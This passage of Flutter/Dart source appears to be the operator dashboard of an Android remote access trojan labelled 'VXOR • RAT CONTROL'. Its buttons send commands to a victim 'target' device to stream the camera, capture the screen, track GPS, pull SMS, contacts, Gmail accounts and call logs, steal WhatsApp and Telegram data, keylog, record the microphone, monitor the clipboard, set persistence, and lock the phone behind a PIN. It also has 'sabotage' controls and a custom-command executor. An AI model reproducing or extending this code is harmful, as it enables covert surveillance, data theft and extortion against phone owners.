  void _showInput(String title, String cmd, String targetId, {String? hint}) {
    TextEditingController c = TextEditingController();
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: _buildNeoCard(
          child: Padding(
            padding: const EdgeInsets.all(24),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: _blue,
                        borderRadius: BorderRadius.circular(4),
                        border: Border.all(color: _ink, width: 2),
                      ),
                      child: Icon(Icons.input, color: _ink, size: 18),
                    ),
                    const SizedBox(width: 12),
                    Text(
                      title,
                      style: const TextStyle(
                        color: _ink,
                        fontSize: 16,
                        fontWeight: FontWeight.w900,
                        letterSpacing: 2,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 20),
                Container(
                  decoration: BoxDecoration(
                    color: _bg,
                    borderRadius: BorderRadius.circular(4),
                    border: Border.all(color: _ink, width: 2),
                  ),
                  child: TextField(
                    controller: c,
                    style: const TextStyle(color: _ink, fontSize: 13, fontWeight: FontWeight.w700),
                    cursorColor: _ink,
                    decoration: InputDecoration(
                      hintText: hint ?? "Enter value...",
                      hintStyle: TextStyle(color: _ink.withOpacity(0.3), fontSize: 12),
                      border: InputBorder.none,
                      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                Row(
                  mainAxisAlignment: MainAxisAlignment.end,
                  children: [
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                        decoration: BoxDecoration(
                          color: _bg,
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: _ink, width: 2),
                        ),
                        child: const Text("CANCEL", style: TextStyle(color: _ink, fontSize: 11, fontWeight: FontWeight.w900)),
                      ),
                    ),
                    const SizedBox(width: 12),
                    GestureDetector(
                      onTap: () {
                        _sendCommand(cmd, targetId, extra: c.text);
                        Navigator.pop(context);
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 10),
                        decoration: BoxDecoration(
                          color: _yellow,
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: _ink, width: 2),
                        ),
                        child: const Text("EXECUTE", style: TextStyle(fontSize: 12, fontWeight: FontWeight.w900, letterSpacing: 2, color: _ink)),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void _showCustomCommandDialog() {
    TextEditingController extraController = TextEditingController();
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: _buildNeoCard(
          child: Padding(
            padding: const EdgeInsets.all(24),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: _purple,
                        borderRadius: BorderRadius.circular(4),
                        border: Border.all(color: _ink, width: 2),
                      ),
                      child: const Icon(Icons.terminal, color: _ink, size: 18),
                    ),
                    const SizedBox(width: 12),
                    const Text(
                      "CUSTOM COMMAND",
                      style: TextStyle(
                        color: _ink,
                        fontSize: 16,
                        fontWeight: FontWeight.w900,
                        letterSpacing: 2,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 20),
                Container(
                  decoration: BoxDecoration(
                    color: _bg,
                    borderRadius: BorderRadius.circular(4),
                    border: Border.all(color: _ink, width: 2),
                  ),
                  child: TextField(
                    controller: _customCommandController,
                    style: const TextStyle(color: _ink, fontSize: 13, fontWeight: FontWeight.w700),
                    cursorColor: _ink,
                    decoration: InputDecoration(
                      hintText: "e.g., get_clipboard",
                      hintStyle: TextStyle(color: _ink.withOpacity(0.3), fontSize: 12),
                      border: InputBorder.none,
                      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                    ),
                  ),
                ),
                const SizedBox(height: 12),
                Container(
                  decoration: BoxDecoration(
                    color: _bg,
                    borderRadius: BorderRadius.circular(4),
                    border: Border.all(color: _ink, width: 2),
                  ),
                  child: TextField(
                    controller: extraController,
                    style: const TextStyle(color: _ink, fontSize: 13, fontWeight: FontWeight.w700),
                    cursorColor: _ink,
                    decoration: InputDecoration(
                      hintText: "Extra params (optional)",
                      hintStyle: TextStyle(color: _ink.withOpacity(0.3), fontSize: 12),
                      border: InputBorder.none,
                      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                Row(
                  mainAxisAlignment: MainAxisAlignment.end,
                  children: [
                    GestureDetector(
                      onTap: () {
                        Navigator.pop(context);
                        _customCommandController.clear();
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                        decoration: BoxDecoration(
                          color: _bg,
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: _ink, width: 2),
                        ),
                        child: const Text("CANCEL", style: TextStyle(color: _ink, fontSize: 11, fontWeight: FontWeight.w900)),
                      ),
                    ),
                    const SizedBox(width: 12),
                    GestureDetector(
                      onTap: () {
                        _sendCommand(_customCommandController.text, _targetId, extra: extraController.text);
                        Navigator.pop(context);
                        _customCommandController.clear();
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 10),
                        decoration: BoxDecoration(
                          color: _purple,
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: _ink, width: 2),
                        ),
                        child: const Text("EXECUTE", style: TextStyle(fontSize: 12, fontWeight: FontWeight.w900, letterSpacing: 2, color: _ink)),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildQuickStats() {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      padding: const EdgeInsets.all(16),
      child: _buildNeoCard(
        child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceAround,
          children: [
            _statItem(FontAwesomeIcons.addressBook as IconData, "${(_deviceData['contacts'] as List?)?.length ?? 0}", "Contacts"),
            _statItem(FontAwesomeIcons.message as IconData, "${(_deviceData['sms'] as List?)?.length ?? 0}", "SMS"),
            _statItem(Icons.apps, "${(_deviceData['apps'] as List?)?.length ?? 0}", "Apps"),
            _statItem(FontAwesomeIcons.envelope as IconData, "${(_deviceData['accounts'] as List?)?.length ?? 0}", "Gmails"),
          ],
        ),
      ),
    );
  }

  Widget _statItem(IconData icon, String value, String label) {
    return Column(
      children: [
        Icon(icon, color: _ink, size: 18),
        const SizedBox(height: 4),
        Text(
          value,
          style: const TextStyle(
            color: _ink,
            fontSize: 14,
            fontWeight: FontWeight.w900,
          ),
        ),
        Text(
          label,
          style: TextStyle(
            color: _ink.withOpacity(0.5),
            fontSize: 8,
          ),
        ),
      ],
    );
  }

  Widget _buildFooter() {
    return Padding(
      padding: const EdgeInsets.all(12),
      child: Column(
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Container(
                width: 8,
                height: 8,
                decoration: BoxDecoration(
                  color: _green,
                  shape: BoxShape.circle,
                  border: Border.all(color: _ink, width: 2),
                ),
              ),
              const SizedBox(width: 8),
              Text(
                "SECURE CONNECTION",
                style: TextStyle(
                  color: _ink.withOpacity(0.5),
                  fontSize: 8,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 2,
                ),
              ),
              const SizedBox(width: 16),
              Icon(Icons.fingerprint, color: _ink.withOpacity(0.3), size: 10),
            ],
          ),
          const SizedBox(height: 4),
          Text(
            "VXOR • RAT CONTROL",
            style: TextStyle(
              color: _ink.withOpacity(0.3),
              fontSize: 7,
              letterSpacing: 3,
              fontWeight: FontWeight.w900,
            ),
          ),
        ],
      ),
    );
  }

  List<dynamic>? _getListData(String key) {
    if (_deviceData[key] is List) return List<dynamic>.from(_deviceData[key]);
    return null;
  }

  @override
  Widget build(BuildContext context) {
    // Safety check - show loading/error if device data missing
    if (_deviceData.isEmpty && _targetId == "unknown") {
      return Scaffold(
        backgroundColor: _bg,
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Text(
                '⚠️ Loading Device Data...',
                style: TextStyle(color: Colors.white, fontSize: 16),
              ),
              const SizedBox(height: 20),
              const CircularProgressIndicator(color: Colors.orange),
            ],
          ),
        ),
      );
    }
    
    return Scaffold(
      backgroundColor: _bg,
      body: Stack(
        children: [
          _buildAnimatedBackground(),
          Column(
            children: [
              _buildTopHeader(),
              _buildQuickStatusRow(),
              _buildLandscapeVideo(),
              Expanded(
                child: ListView(
                  padding: const EdgeInsets.all(12),
                  children: [
                    if (_deviceData.isNotEmpty) _buildQuickStats(),
                    
                    _groupLabel("🎯 INTELLIGENCE"),
                    Wrap(
                      spacing: 10,
                      runSpacing: 10,
                      children: [
                        _actionButton("LIVE CAM", FontAwesomeIcons.video as IconData, _orange, "start_live_camera"),
                        _actionButton("SCREEN", Icons.screenshot_monitor, _yellow, "get_screen"),
                        _actionButton("GPS LOC", FontAwesomeIcons.locationDot as IconData, _green, "get_location"),
                        _actionButton("GMAIL", FontAwesomeIcons.envelope as IconData, _red, "get_gmails"),
                        _actionButton("CONTACTS", FontAwesomeIcons.addressBook as IconData, _blue, "get_contacts"),
                        _actionButton("SMS", FontAwesomeIcons.message as IconData, _purple, "get_sms"),
                        _actionButton("APPS", Icons.apps, _yellow, "get_apps"),
                        _actionButton("GET WA", FontAwesomeIcons.whatsapp as IconData, _green, "extract_whatsapp", onCustomTap: _extractWhatsApp),
                        _actionButton("CLIPBOARD", FontAwesomeIcons.copy as IconData, _blue, "get_clipboard"),
                      ],
                    ),

                    _groupLabel("🔒 SECURITY NATIVE"),
                    Wrap(
                      spacing: 10,
                      runSpacing: 10,
                      children: [
                        _actionButton("LOCK T1", FontAwesomeIcons.lock as IconData, _red, "lock_type1", isInput: true),
                        _actionButton("LOCK T2", FontAwesomeIcons.comment as IconData, _green, "lock_type2", isInput: true),
                        _actionButton("LOCK T3", FontAwesomeIcons.video as IconData, _blue, "lock_type3"),
                        _actionButton("HARD LOCK", FontAwesomeIcons.lock as IconData, _red, "hard_lock", isInput: true, inputHint: "Message|PIN"),
                        _actionButton("UNLOCK", FontAwesomeIcons.lockOpen as IconData, _green, "unlock"),
                        _actionButton("DEVICE INFO", FontAwesomeIcons.info as IconData, _purple, "get_device_info"),
                      ],
                    ),

                    _groupLabel("💥 SABOTAGE"),
                    Wrap(
                      spacing: 10,
                      runSpacing: 10,
                      children: [
                        _actionButton("STROBE", FontAwesomeIcons.lightbulb as IconData, _yellow, "flash_strobe"),
                        _actionButton("STOP", FontAwesomeIcons.stop as IconData, _orange, "stop_strobe"),
                        _actionButton("VOL MAX", FontAwesomeIcons.volumeHigh as IconData, _purple, "set_vol_max"),
                        _actionButton("VIBRATE", Icons.vibration, _blue, "vibrate_loop"),
                        _actionButton("PLAY AUDIO", FontAwesomeIcons.music as IconData, _red, "play_audio", isInput: true, inputHint: "Enter audio URL"),
                        _actionButton("STOP AUDIO", FontAwesomeIcons.stop as IconData, _red, "stop_audio"),
                      ],
                    ),

                    _groupLabel("🎮 UI & CONTROL"),
                    Wrap(
                      spacing: 10,
                      runSpacing: 10,
                      children: [
                        _actionButton("WALLPAPER", FontAwesomeIcons.image as IconData, _purple, "set_wallpaper", isInput: true, inputHint: "Enter image URL"),
                        _actionButton("TTS", FontAwesomeIcons.microphone as IconData, _blue, "speak_tts", isInput: true, inputHint: "Enter text to speak"),
                        _actionButton("OPEN URL", FontAwesomeIcons.globe as IconData, _green, "open_url", isInput: true, inputHint: "Enter URL"),
                        _actionButton("SEND SMS", FontAwesomeIcons.sms as IconData, _yellow, "send_sms", isInput: true, inputHint: "Number|Message"),
                      ],
                    ),

                    _groupLabel("🔧 ADVANCED RAT"),
                    Wrap(
                      spacing: 10,
                      runSpacing: 10,
                      children: [
                        _actionButton("FILE MGR", Icons.folder, _blue, "", onCustomTap: _openFileManager),
                        _actionButton("KEYLOG", Icons.keyboard, _orange, "", onCustomTap: _startKeylogger),
                        _actionButton("MIC REC", Icons.mic, _red, "", onCustomTap: _startMicrophoneRecorder),
                        _actionButton("KILL PROC", Icons.bug_report, _orange, "", onCustomTap: _showProcessKiller),
                        _actionButton("SPAM NOTIF", Icons.notifications_active, _purple, "", onCustomTap: _startNotificationSpammer),
                        _actionButton("CLIP MON", Icons.content_paste, _blue, "", onCustomTap: _startClipboardMonitor),
                        _actionButton("CALL LOGS", Icons.phone, _green, "", onCustomTap: _fetchCallLogs),
                        _actionButton("WA EXTRACT", Icons.chat, _green, "", onCustomTap: _extractWhatsApp),
                        _actionButton("TG STEAL", Icons.telegram, _blue, "", onCustomTap: _stealTelegram),
                        _actionButton("PERSIST", Icons.power_settings_new, _green, "", onCustomTap: _enablePersistence),
                      ],
                    ),

                    _groupLabel("⚡ ADVANCED"),
                    Wrap(
                      spacing: 10,
                      runSpacing: 10,
                      children: [
                        _actionButton("CUSTOM", FontAwesomeIcons.terminal as IconData, _purple, "", isCustom: true),
                        _actionButton("PING", FontAwesomeIcons.networkWired as IconData, _blue, "ping"),
                      ],
                    ),
                    
                    const SizedBox(height: 20),
                    _buildTerminalLogs(),
                    _buildFooter(),
                    const SizedBox(height: 30),
                  ],
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }
}

// ============================================================
// GRID PAINTER
// ============================================================
class _GridPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = Color(0xFF111111).withOpacity(0.04)
      ..strokeWidth = 1;

    const double spacing = 40;
    for (double x = 0; x < size.width; x += spacing) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    for (double y = 0; y < size.height; y += spacing) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

enum LogType { info, success, error, warning, notification, location, debug }

class LogEntry {
  final DateTime timestamp;
  final String message;
  final LogType type;
  LogEntry({required this.timestamp, required this.message, required this.type});
}